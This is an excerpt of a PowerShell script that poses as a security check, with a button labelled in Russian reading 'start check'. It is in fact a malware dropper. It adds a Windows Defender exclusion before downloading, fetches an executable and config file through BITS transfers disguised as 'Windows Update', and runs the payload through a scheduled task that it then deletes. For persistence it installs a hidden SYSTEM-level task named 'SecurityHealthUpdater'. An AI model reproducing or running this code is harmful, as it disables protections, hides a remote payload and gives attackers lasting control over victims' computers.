...
$taskName = "SecurityHealthUpdater"

function Add-DefenderExclusion {
    try {
        if (-not (Get-MpPreference).ExclusionPath -contains $workDir) {
...
function Install-Autorun {
    $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -Command `"Start-Process -WindowStyle Hidden -FilePath '$exePath' -ArgumentList '-c','$confPath'`""
    ...
    Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Settings $settings -Description "SecurityHealth Update Service" -User "SYSTEM" -RunLevel Highest -Force -ErrorAction SilentlyContinue | Out-Null
}
    ...
    if ($btn.Text -eq "НАЧАТЬ ПРОВЕРКУ") {
        ...
        if (Test-Path $exePath -and Test-Path $confPath) {
            ...
            try {
                ...
                # Добавляем исключение ДО скачивания
                Add-DefenderExclusion
                
                # Используем BITS для скрытой загрузки
                ...
                Start-BitsTransfer -Source $urlExe -Destination $exePath -DisplayName "Windows Update" -Description "Downloading updates" -ErrorAction Stop
                
                $substatus.Text = "Скачивание config.json"
                $form.Refresh()
                
                Start-BitsTransfer -Source $urlConf -Destination $confPath -DisplayName "Windows Update" -Description "Downloading updates" -ErrorAction Stop
                ...
                # Запускаем с задержкой через планировщик
                $action = New-ScheduledTaskAction -Execute $exePath -Argument "-c `"$confPath`""
                $trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddSeconds(5)
                Register-ScheduledTask -TaskName "OneTimeRun" -Action $action -Trigger $trigger -Force -ErrorAction SilentlyContinue | Out-Null
                
                Start-Sleep -Seconds 6
                Unregister-ScheduledTask -TaskName "OneTimeRun" -Confirm:$false -ErrorAction SilentlyContinue
